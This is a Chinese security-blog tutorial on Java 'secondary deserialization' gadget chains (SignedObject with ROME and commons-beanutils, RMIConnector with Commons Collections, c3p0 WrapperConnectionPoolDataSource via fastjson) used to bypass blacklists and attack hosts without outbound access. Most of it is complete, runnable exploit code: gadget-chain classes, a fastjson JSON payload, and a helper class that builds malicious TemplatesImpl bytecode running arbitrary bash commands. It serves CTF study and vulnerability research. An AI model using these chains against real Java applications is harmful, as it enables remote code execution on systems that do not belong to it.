### [前言](https://tttang.com/archive/1701/#toc_)

不记得是哪一场比赛了，遇到了一个 Java 的题目，过滤了很多关键类，不管茯苓把 CC 链如何拆开组合，都没有办法绕过。

就在此时，大佬看了一眼说，用二次反序列化就可以绕过了。“二次反序列化”这六个字重重地敲在了我的心巴上，从那以后我就对二次反序列化产生了莫名的渴望。

茯苓开始详细学习时，发现没有二次反序列化比较系统的学习文章，那么，就自己总结一个。

简单介绍下二次反序列化，顾名思义，就是反序列化两次，其主要意义是**绕过黑名单的限制或不出网利用**

PS：本文用到的工具类会放在文末

### [SignedObject](https://tttang.com/archive/1701/#toc_signedobject)

#### [原理](https://tttang.com/archive/1701/#toc__1)

它，是`java.security`下一个用于创建真实运行时对象的类，更具体地说，`SignedObject`包含另一个`Serializable`对象。

太完美了，这个类简直是为二次反序列化而存在的，来关注下它的`getObject()`

[![image-20220809181727529.png](https://storage.tttang.com/media/attachment/2022/08/10/52c04b8f-766c-40d4-add4-fb5795464214.png)](https://storage.tttang.com/media/attachment/2022/08/10/52c04b8f-766c-40d4-add4-fb5795464214.png)

反序列化的内容也是可控

[![image-20220809182131901.png](https://storage.tttang.com/media/attachment/2022/08/10/803065c6-c0e1-4653-89eb-a37344acbe58.png)](https://storage.tttang.com/media/attachment/2022/08/10/803065c6-c0e1-4653-89eb-a37344acbe58.png)

那么茯苓思路瞬间清晰了，先构造一个恶意`SignedObject`

```
KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
kpg.initialize(1024);
KeyPair kp = kpg.generateKeyPair();
SignedObject signedObject = new SignedObject(恶意对象 用于第二次反序列化, kp.getPrivate(), Signature.getInstance("DSA"));
```

然后调用它的`getObject()`方法即可，那么现在压力来到了如何调用这个方法这边

#### [rome](https://tttang.com/archive/1701/#toc_rome)

##### [ToStringBean](https://tttang.com/archive/1701/#toc_tostringbean)

提到调用 getter 方法，茯苓第一个想到的就是 rome 反序列化，众所周知，rome 的`ToStringBean`的`toString()`方法可以办到这件事，理论上是可行的，实际也是可以构造的

因为`ObjectBean`其在实例化时会实例化三个 bean，这样构造出来的内容过分长了，茯苓不喜欢

~~大家可以自行构造试试~~，茯苓绝不是那种不负责的人，还是给出例子，但不进行具体分析

```
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ObjectBean;
import javax.xml.transform.Templates;
import java.security.*;
import java.util.HashMap;
import static util.Tool.*;

public class R_test {
    public static void main(String[] args) throws Exception{
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{
                payload("mate-calc").toBytecode()});
        setFieldValue(obj, "_name", "Poria");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        HashMap hashMap1 = getpayload(Templates.class, obj);

        KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
        kpg.initialize(1024);
        KeyPair kp = kpg.generateKeyPair();
        SignedObject signedObject = new SignedObject(hashMap1, kp.getPrivate(), Signature.getInstance("DSA"));

        HashMap hashMap2 = getpayload(SignedObject.class, signedObject);

        run(hashMap2, "debug", "object");
    }
    public static HashMap getpayload(Class clazz, Object obj) throws Exception {
        ObjectBean objectBean = new ObjectBean(ObjectBean.class, new ObjectBean(String.class, "rand"));
        HashMap hashMap = new HashMap();
        hashMap.put(objectBean, "rand");
        ObjectBean expObjectBean = new ObjectBean(clazz, obj);
        setFieldValue(objectBean, "_equalsBean", new EqualsBean(ObjectBean.class, expObjectBean));
        return hashMap;
    }
} 
```

##### [EqualsBean](https://tttang.com/archive/1701/#toc_equalsbean)

rome 链的关键转折点在于`pReadMethod.invoke(_obj,NO_PARAMS)`，`EqualsBean`也存在这个关键代码

[![image-20220810093914403.png](https://storage.tttang.com/media/attachment/2022/08/10/960244e3-9d21-400c-9666-d3a0ed4557b6.png)](https://storage.tttang.com/media/attachment/2022/08/10/960244e3-9d21-400c-9666-d3a0ed4557b6.png)

那么茯苓可以利用珍藏多年的 CC7 链，利用`Hashtable`来触发`equals`

[![image-20220810094410681.png](https://storage.tttang.com/media/attachment/2022/08/10/3854f91a-a984-4735-ab06-a5024f09c548.png)](https://storage.tttang.com/media/attachment/2022/08/10/3854f91a-a984-4735-ab06-a5024f09c548.png)

这步是 CC7 的构造方式，因为要构造两遍，所以写为静态方法。

[![image-20220810095018646.png](https://storage.tttang.com/media/attachment/2022/08/10/1549b374-1a62-41b1-bdfd-2e32d54ac285.png)](https://storage.tttang.com/media/attachment/2022/08/10/1549b374-1a62-41b1-bdfd-2e32d54ac285.png)

构造恶意`TemplatesImpl`，将其装入第一个`Hashtable`

[![image-20220810095408001.png](https://storage.tttang.com/media/attachment/2022/08/10/d9dd1302-a9a4-4309-add2-36db703ff92b.png)](https://storage.tttang.com/media/attachment/2022/08/10/d9dd1302-a9a4-4309-add2-36db703ff92b.png)

构造恶意`SignedObject`，将其装入第二个`Hashtable`

[![image-20220810100110091.png](https://storage.tttang.com/media/attachment/2022/08/10/9d704669-9d02-454f-8877-46654ad4579c.png)](https://storage.tttang.com/media/attachment/2022/08/10/9d704669-9d02-454f-8877-46654ad4579c.png)

最终 exp

```
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import javax.xml.transform.Templates;
import java.security.*;
import java.util.HashMap;
import java.util.Hashtable;
import static util.Tool.*;

public class R_SignedObject {
    public static void main(String[] args) throws Exception{
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{
                payload("mate-calc").toBytecode()});
        setFieldValue(obj, "_name", "Poria");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        Hashtable table1 = getPayload(Templates.class, obj);

        KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
        kpg.initialize(1024);
        KeyPair kp = kpg.generateKeyPair();
        SignedObject signedObject = new SignedObject(table1, kp.getPrivate(), Signature.getInstance("DSA"));

        Hashtable table2 = getPayload(SignedObject.class, signedObject);

        run(table2, "debug", "object");
    }
    public static Hashtable getPayload (Class clazz, Object payloadObj) throws Exception{
        EqualsBean bean = new EqualsBean(String.class, "r");
        HashMap map1 = new HashMap();
        HashMap map2 = new HashMap();
        map1.put("yy", bean);
        map1.put("zZ", payloadObj);
        map2.put("zZ", bean);
        map2.put("yy", payloadObj);
        Hashtable table = new Hashtable();
        table.put(map1, "1");
        table.put(map2, "2");
        setFieldValue(bean, "_beanClass", clazz);
        setFieldValue(bean, "_obj", payloadObj);
        return table;
    }
}
```

值得一提的是，因为 rome 的特殊性，该利用既可以用于`ObjectInputStream`的反序列化，也可以用于`HessianInput`的反序列化，茯苓分别给出这两种情况下的调用栈

```
readObject:431, ObjectInputStream (java.io)
getObject:179, SignedObject (java.security)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
beanEquals:146, EqualsBean (com.sun.syndication.feed.impl)
equals:103, EqualsBean (com.sun.syndication.feed.impl)
equals:495, AbstractMap (java.util)
reconstitutionPut:1241, Hashtable (java.util)
readObject:1215, Hashtable (java.util)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
invokeReadObject:1170, ObjectStreamClass (java.io)
readSerialData:2178, ObjectInputStream (java.io)
readOrdinaryObject:2069, ObjectInputStream (java.io)
readObject0:1573, ObjectInputStream (java.io)
readObject:431, ObjectInputStream (java.io)
readObject:431, ObjectInputStream (java.io)
getObject:179, SignedObject (java.security)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
beanEquals:146, EqualsBean (com.sun.syndication.feed.impl)
equals:103, EqualsBean (com.sun.syndication.feed.impl)
equals:495, AbstractMap (java.util)
put:470, Hashtable (java.util)
readMap:114, MapDeserializer (com.caucho.hessian.io)
readMap:532, SerializerFactory (com.caucho.hessian.io)
readObject:1160, HessianInput (com.caucho.hessian.io)
```

#### [commons-beanutils](https://tttang.com/archive/1701/#toc_commons-beanutils)

茯苓苦思冥想啊，突然想到，能调用 getter 方法的可不止上面提到的，对，就是那个，喊出来吧

##### [BeanComparator](https://tttang.com/archive/1701/#toc_beancomparator)

[![image-20220810101743856.png](https://storage.tttang.com/media/attachment/2022/08/10/3b3536ad-f801-48e1-a14d-e992b831414a.png)](https://storage.tttang.com/media/attachment/2022/08/10/3b3536ad-f801-48e1-a14d-e992b831414a.png)

这条链相信大家都耳熟能详，结合p神构造 CBShiro 的方式让该链只依赖于 commons-beanutils

```
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.beanutils.BeanComparator;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.Signature;
import java.security.SignedObject;
import java.util.PriorityQueue;
import static util.Tool.*;

public class CB_SingedfObject {
    public static void main(String[] args) throws Exception {
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{
                payload("mate-calc").toBytecode()});
        setFieldValue(obj, "_name", "Poria");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        PriorityQueue queue1 = getpayload(obj, "outputProperties");

        KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
        kpg.initialize(1024);
        KeyPair kp = kpg.generateKeyPair();
        SignedObject signedObject = new SignedObject(queue1, kp.getPrivate(), Signature.getInstance("DSA"));

        PriorityQueue queue2 = getpayload(signedObject, "object");

        run(queue2, "debug", "object");
    }
    public static PriorityQueue<Object> getpayload(Object object, String string) throws Exception {
        BeanComparator beanComparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        PriorityQueue priorityQueue = new PriorityQueue(2, beanComparator);
        priorityQueue.add("1");
        priorityQueue.add("2");
        setFieldValue(beanComparator, "property", string);
        setFieldValue(priorityQueue, "queue", new Object[]{object, null});
        return priorityQueue;
    }
}
```

构造过程和上面相似，不在赘述，茯苓在这里直接给出调用栈

```
readObject:431, ObjectInputStream (java.io)
getObject:179, SignedObject (java.security)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
invokeMethod:2116, PropertyUtilsBean (org.apache.commons.beanutils)
getSimpleProperty:1267, PropertyUtilsBean (org.apache.commons.beanutils)
getNestedProperty:808, PropertyUtilsBean (org.apache.commons.beanutils)
getProperty:884, PropertyUtilsBean (org.apache.commons.beanutils)
getProperty:464, PropertyUtils (org.apache.commons.beanutils)
compare:163, BeanComparator (org.apache.commons.beanutils)
siftDownUsingComparator:722, PriorityQueue (java.util)
siftDown:688, PriorityQueue (java.util)
heapify:737, PriorityQueue (java.util)
readObject:797, PriorityQueue (java.util)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
invokeReadObject:1170, ObjectStreamClass (java.io)
readSerialData:2178, ObjectInputStream (java.io)
readOrdinaryObject:2069, ObjectInputStream (java.io)
readObject0:1573, ObjectInputStream (java.io)
readObject:431, ObjectInputStream (java.io)
```

#### [小结](https://tttang.com/archive/1701/#toc__2)

对于 rome 来说，二次反序列化多用于目标不出网的情况（当然也可以用于绕过黑名单）

而 CB 这条，唯一作用就是绕过黑名单了吧

这是正常的CB链

[![image-20220810102847849.png](https://storage.tttang.com/media/attachment/2022/08/10/16364d45-d896-47e4-bc03-ea195d7bbf2a.png)](https://storage.tttang.com/media/attachment/2022/08/10/16364d45-d896-47e4-bc03-ea195d7bbf2a.png)

这是二次反序列化之后的

[![image-20220810102933448.png](https://storage.tttang.com/media/attachment/2022/08/10/aabfc702-d90f-448c-8eb6-311e7a0e5c7b.png)](https://storage.tttang.com/media/attachment/2022/08/10/aabfc702-d90f-448c-8eb6-311e7a0e5c7b.png)

### [RMIConnector](https://tttang.com/archive/1701/#toc_rmiconnector)

#### [原理](https://tttang.com/archive/1701/#toc__3)

它，是`javax.management`下一个与远程 rmi 连接器的连接类，但却有自己的想法

关注它的`findRMIServerJRMP`方法

[![image-20220810105313314.png](https://storage.tttang.com/media/attachment/2022/08/10/d025a575-255d-4c20-b3bc-d9c4bf1e6c1b.png)](https://storage.tttang.com/media/attachment/2022/08/10/d025a575-255d-4c20-b3bc-d9c4bf1e6c1b.png)

往上找，看到要求 path 以 /stub/ 开头

[![image-20220810105450289.png](https://storage.tttang.com/media/attachment/2022/08/10/3f2e07f7-9905-4195-8f43-16c918ff8f77.png)](https://storage.tttang.com/media/attachment/2022/08/10/3f2e07f7-9905-4195-8f43-16c918ff8f77.png)

继续往上找，在该类的 public 方法`connect`中看到调用，要求 rmiServer 为 null

[![image-20220810105824784.png](https://storage.tttang.com/media/attachment/2022/08/10/0eca3b76-f4f7-43b8-a55d-44b9ce358b74.png)](https://storage.tttang.com/media/attachment/2022/08/10/0eca3b76-f4f7-43b8-a55d-44b9ce358b74.png)

有一个绝佳的构造方法符合茯苓的要求

[![image-20220810110134482.png](https://storage.tttang.com/media/attachment/2022/08/10/46368265-b813-4256-815c-6b84db785620.png)](https://storage.tttang.com/media/attachment/2022/08/10/46368265-b813-4256-815c-6b84db785620.png)

到此，这个利用方法就通了，给出构造

```
JMXServiceURL jmxServiceURL = new JMXServiceURL("service:jmx:rmi://");
setFieldValue(jmxServiceURL, "urlPath", "/stub/base64string");
RMIConnector rmiConnector = new RMIConnector(jmxServiceURL, null);
```

现在只要能调用它的`connect`方法就可以了

#### [CC链](https://tttang.com/archive/1701/#toc_cc)

说到调用任意方法，茯苓一下子就想到了 CC 链

##### [InvokerTransformer](https://tttang.com/archive/1701/#toc_invokertransformer)

将`connect`装入

[![image-20220810111220880.png](https://storage.tttang.com/media/attachment/2022/08/10/edba0a7a-2d80-4c2f-9214-773ccf59953f.png)](https://storage.tttang.com/media/attachment/2022/08/10/edba0a7a-2d80-4c2f-9214-773ccf59953f.png)

用`TiedMapEntry`封装`LazyMap`

[![image-20220810111306848.png](https://storage.tttang.com/media/attachment/2022/08/10/df00997f-3313-4f07-aee4-67d994a61c80.png)](https://storage.tttang.com/media/attachment/2022/08/10/df00997f-3313-4f07-aee4-67d994a61c80.png)

最后装入`HashMap`用于触发整条链

[![image-20220810111511145.png](https://storage.tttang.com/media/attachment/2022/08/10/b7234637-9955-4100-b2f8-7450753f59d4.png)](https://storage.tttang.com/media/attachment/2022/08/10/b7234637-9955-4100-b2f8-7450753f59d4.png)

完整 exp

```
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import javax.management.remote.JMXServiceURL;
import javax.management.remote.rmi.RMIConnector;
import java.util.HashMap;
import java.util.Map;
import static util.Tool.*;

public class CC_RMIConnector {
    public static void main(String[] args) throws Exception {
        JMXServiceURL jmxServiceURL = new JMXServiceURL("service:jmx:rmi://");
        setFieldValue(jmxServiceURL, "urlPath", "/stub/base64string");
        RMIConnector rmiConnector = new RMIConnector(jmxServiceURL, null);

        InvokerTransformer invokerTransformer = new InvokerTransformer("connect", null, null);

        HashMap<Object, Object> map = new HashMap<>();
        Map<Object,Object> lazyMap = LazyMap.decorate(map, new ConstantTransformer(1));
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, rmiConnector);

        HashMap<Object, Object> expMap = new HashMap<>();
        expMap.put(tiedMapEntry, "Poria");
        lazyMap.remove(rmiConnector);

        setFieldValue(lazyMap,"factory", invokerTransformer);

        run(expMap, "debug", "object");
    }
}
```

调用栈

```
readObject:424, ObjectInputStream (java.io)
findRMIServerJRMP:2007, RMIConnector (javax.management.remote.rmi)
findRMIServer:1924, RMIConnector (javax.management.remote.rmi)
connect:287, RMIConnector (javax.management.remote.rmi)
connect:249, RMIConnector (javax.management.remote.rmi)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
transform:126, InvokerTransformer (org.apache.commons.collections.functors)
get:158, LazyMap (org.apache.commons.collections.map)
getValue:74, TiedMapEntry (org.apache.commons.collections.keyvalue)
hashCode:121, TiedMapEntry (org.apache.commons.collections.keyvalue)
hash:339, HashMap (java.util)
readObject:1410, HashMap (java.util)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
invokeReadObject:1170, ObjectStreamClass (java.io)
readSerialData:2178, ObjectInputStream (java.io)
readOrdinaryObject:2069, ObjectInputStream (java.io)
readObject0:1573, ObjectInputStream (java.io)
readObject:431, ObjectInputStream (java.io)
```

#### [小结](https://tttang.com/archive/1701/#toc__4)

这条链可以用于存在 CC 依赖但是有黑名单时候，说实话，茯苓觉得这个链很鸡肋，可能只能面对一些很极端的情况

### [WrapperConnectionPoolDataSource](https://tttang.com/archive/1701/#toc_wrapperconnectionpooldatasource)

#### [原理](https://tttang.com/archive/1701/#toc__5)

它，是`com.mchange.v2.c3p0`下的。。对不起编不下去了

`WrapperConnectionPoolDataSource`继承于`WrapperConnectionPoolDataSourceBase`，在`WrapperConnectionPoolDataSourceBase`中存在属性`userOverridesAsString`及其`setter`方法`setUserOverridesAsString`，触发`fireVetoableChange`事件处理

[![image-20220810143253198.png](https://storage.tttang.com/media/attachment/2022/08/10/e3256f46-f66e-4ee5-9454-dac045e7581d.png)](https://storage.tttang.com/media/attachment/2022/08/10/e3256f46-f66e-4ee5-9454-dac045e7581d.png)

其中有一个判断语句，当其属性为`userOverridesAsString`时，将调用`parseUserOverridesAsString`方法

[![image-20220810143431243.png](https://storage.tttang.com/media/attachment/2022/08/10/53fc599e-158f-4ed0-bccf-493fe31e61f7.png)](https://storage.tttang.com/media/attachment/2022/08/10/53fc599e-158f-4ed0-bccf-493fe31e61f7.png)

截取`HexAsciiSerializedMap`之后的内容，进入到`fromByteArray`

[![image-20220810144104414.png](https://storage.tttang.com/media/attachment/2022/08/10/3ea0279b-0522-410e-b646-8e6fd4f9cba8.png)](https://storage.tttang.com/media/attachment/2022/08/10/3ea0279b-0522-410e-b646-8e6fd4f9cba8.png)

最后进入到`deserializeFromByteArray`中，进行二次反序列化

[![image-20220810144223161.png](https://storage.tttang.com/media/attachment/2022/08/10/cf54401f-d786-4682-9163-4137ee385cc0.png)](https://storage.tttang.com/media/attachment/2022/08/10/cf54401f-d786-4682-9163-4137ee385cc0.png)

至此该链子就通了，构造起来呢，相信大家也都看出来了，可以利用 fastjson 来达成，在小于1.2.47的版本，使用缓存绕过

```
{
    "rand1": {
        "@type": "java.lang.Class",
        "val": "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource"
    },
    "rand2": {
        "@type": "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource",
        "userOverridesAsString": "HexAsciiSerializedMap:hexstring;",
    }
}
```

最后那个封号不要忘记！

#### [C3P0_Hex](https://tttang.com/archive/1701/#toc_c3p0_hex)

这条链子就得看依赖了，有什么打什么，记得把序列化后的内容转化为16进制字符就可以了

茯苓这里给出 CBShiro 的例子（别问，问就是偏爱）

```
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.beanutils.BeanComparator;
import java.util.PriorityQueue;
import static util.Tool.*;

public class Hex {
    public static void main(String[] args) throws Exception{
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{
                payload("mate-calc").toBytecode()});
        setFieldValue(obj, "_name", "Poria");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        queue.add("1");
        queue.add("1");

        setFieldValue(comparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{obj, null});

        run(queue, "debug", "hex");
    }
}
```

同样的，给出调用栈

```
readObject:431, ObjectInputStream (java.io)
deserializeFromByteArray:144, SerializableUtils (com.mchange.v2.ser)
fromByteArray:123, SerializableUtils (com.mchange.v2.ser)
parseUserOverridesAsString:318, C3P0ImplUtils (com.mchange.v2.c3p0.impl)
vetoableChange:110, WrapperConnectionPoolDataSource$1 (com.mchange.v2.c3p0)
fireVetoableChange:375, VetoableChangeSupport (java.beans)
fireVetoableChange:271, VetoableChangeSupport (java.beans)
setUserOverridesAsString:387, WrapperConnectionPoolDataSourceBase (com.mchange.v2.c3p0.impl)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
setValue:96, FieldDeserializer (com.alibaba.fastjson.parser.deserializer)
parseField:118, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer)
parseField:1061, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
deserialze:756, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
deserialze:271, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
deserialze:267, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
parseObject:370, DefaultJSONParser (com.alibaba.fastjson.parser)
parseObject:523, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:1335, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:1301, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:152, JSON (com.alibaba.fastjson)
parse:162, JSON (com.alibaba.fastjson)
parse:131, JSON (com.alibaba.fastjson)
parseObject:223, JSON (com.alibaba.fastjson)
```

#### [小结](https://tttang.com/archive/1701/#toc__6)

这条链子很明显，是配合`Fastjson`、`Jackson`环境下不出网利用的打法

### [用到的工具类](https://tttang.com/archive/1701/#toc__7)

```
import com.alibaba.fastjson.JSON;
import com.caucho.hessian.io.HessianInput;
import com.caucho.hessian.io.HessianOutput;
import javassist.ClassPool;
import javassist.CtClass;
import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;

public class Tool {
    private Tool(){}
    public static void run(Object obj, String mode, String type) throws Exception {
        switch (type) {
            case "object" :
                String object = base64Encode(serialize(obj));
                System.out.println(object);
                if (mode.equals("debug"))
                    deserialize((base64Decode(object)));
                break;
            case "hessian" :
                String hessian = base64Encode(hessianser(obj));
                System.out.println(hessian);
                if (mode.equals("debug"))
                    hessiandeser(base64Decode(hessian));
                break;
            case "hex" :
                byte[] bytes = serialize(obj);
                String hex = "{\n" +
                        "    \"rand1\": {\n" +
                        "        \"@type\": \"java.lang.Class\",\n" +
                        "        \"val\": \"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\"\n" +
                        "    },\n" +
                        "    \"rand2\": {\n" +
                        "        \"@type\": \"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\",\n" +
                        "        \"userOverridesAsString\": \"HexAsciiSerializedMap:" + bytesToHexString(bytes, bytes.length) + ";\",\n" +
                        "    }\n" +
                        "}";
                System.out.println(hex);
                if (mode.equals("debug"))
                    JSON.parseObject(hex);
                break;
        }
    }

    public static void deserialize(byte[] bytes) throws Exception {
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
        objectInputStream.readObject();
    }
    public static byte[] serialize(Object object) throws Exception {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(object);
        return byteArrayOutputStream.toByteArray();
    }
    public static void hessiandeser(byte[] bytes) throws Exception {
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);
        HessianInput hessianInput = new HessianInput(byteArrayInputStream);
        hessianInput.readObject();
    }
    public static byte[] hessianser(Object object) throws Exception {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        HessianOutput hessianOutput = new HessianOutput(byteArrayOutputStream);
        hessianOutput.getSerializerFactory().setAllowNonSerializable(true);
        hessianOutput.writeObject(object);
        return byteArrayOutputStream.toByteArray();
    }

    public static byte[] base64Decode(String string) {
        Base64.Decoder decoder = Base64.getDecoder();
        return decoder.decode(string);
    }
    public static String base64Encode(byte[] bytes) {
        Base64.Encoder encoder = Base64.getEncoder();
        return encoder.encodeToString(bytes);
    }
    public static String bytesToHexString(byte[] bArray, int length) {
        StringBuffer sb = new StringBuffer(length);
        for(int i = 0; i < length; ++i) {
            String sTemp = Integer.toHexString(255 & bArray[i]);
            if (sTemp.length() < 2) {
                sb.append(0);
            }
            sb.append(sTemp.toUpperCase());
        }
        return sb.toString();
    }

    public static CtClass payload(String string) throws Exception {
        String AbstractTranslet = "com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";
        ClassPool classPool = ClassPool.getDefault();
        classPool.appendClassPath(AbstractTranslet);
        CtClass payload = classPool.makeClass("Evil");
        payload.setSuperclass(classPool.get(AbstractTranslet));
        payload.makeClassInitializer().setBody(
                "java.lang.Runtime.getRuntime().exec(new String[]{\"/bin/bash\", \"-c\",\"" + string + "\"});");
        return payload;
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }
    public static Field getField (final Class<?> clazz, final String fieldName ) throws Exception {
        try {
            Field field = clazz.getDeclaredField(fieldName);
            if ( field != null )
                field.setAccessible(true);
            else if ( clazz.getSuperclass() != null )
                field = getField(clazz.getSuperclass(), fieldName);
            return field;
        }
        catch ( NoSuchFieldException e ) {
            if ( !clazz.getSuperclass().equals(Object.class) ) {
                return getField(clazz.getSuperclass(), fieldName);
            }
            throw e;
        }
    }
}
```

### [结语](https://tttang.com/archive/1701/#toc__8)

那么，就写到这里吧，再写，就不礼貌辣

### [参考文章](https://tttang.com/archive/1701/#toc__9)

http://miku233.viewofthai.link/2022/05/29/buggyLoader/

https://su18.org/

[https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8BROME/](https://longlone.top/安全/java/java反序列化/反序列化篇之ROME/)

https://github.com/H3rmesk1t/Learning_summary/tree/main/WebSec/JAVA